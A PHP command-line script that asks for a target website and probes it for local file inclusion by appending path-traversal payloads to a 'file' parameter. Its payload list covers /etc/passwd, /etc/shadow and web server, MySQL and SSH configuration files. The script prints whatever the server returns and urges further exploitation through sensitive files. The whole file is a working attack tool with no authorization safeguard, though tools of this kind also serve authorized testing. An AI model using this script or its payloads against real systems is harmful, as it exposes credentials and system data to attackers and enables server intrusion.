<?php
// Function to send colored output to the console
function colored_echo($text, $color) {
    switch($color) {
        case 'red':
            echo "\033[0;31m$text\033[0m";
            break;
        case 'green':
            echo "\033[0;32m$text\033[0m";
            break;
        case 'yellow':
            echo "\033[0;33m$text\033[0m";
            break;
        default:
            echo $text;
    }
}

// Function to test LFI vulnerability
function test_lfi_vulnerability($url) {
    $vulnerable = false;

    // Common files to check for LFI vulnerability
    $files_to_include = [
        "../../../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../../../etc/hosts",
        "../../../../../../../../../../../../etc/shadow",
        "../../../../../../../../../../../../etc/group",
        "../../../../../../../../../../../../etc/issue",
        "../../../../../../../../../../../../etc/hostname",
        "../../../../../../../../../../../../etc/apache2/apache2.conf",
        "../../../../../../../../../../../../etc/httpd/httpd.conf",
        "../../../../../../../../../../../../etc/nginx/nginx.conf",
        "../../../../../../../../../../../../etc/mysql/my.cnf",
        "../../../../../../../../../../../../etc/ssh/sshd_config"
    ];

    colored_echo("Testing LFI vulnerability on: $url\n", 'yellow');

    foreach ($files_to_include as $file_to_include) {
        $target_url = $url . "?file=" . urlencode($file_to_include);

        // Send a request to the target URL
        $response = @file_get_contents($target_url);

        if ($response !== false) {
            $vulnerable = true;
            colored_echo("Found LFI vulnerability!\n", 'red');
            colored_echo("File included: $file_to_include\n", 'red');
            colored_echo("Response:\n$response\n", 'red');
            colored_echo("To further exploit the vulnerability, try accessing sensitive files using traversal techniques.\n", 'red');
        }
    }

    if (!$vulnerable) {
        colored_echo("No LFI vulnerability found on the target.\n", 'green');
    }
}

// Prompt user for target website URL
echo "Enter your target website url: ";
$target_url = trim(fgets(STDIN));

// Test LFI vulnerability
test_lfi_vulnerability($target_url);
?>
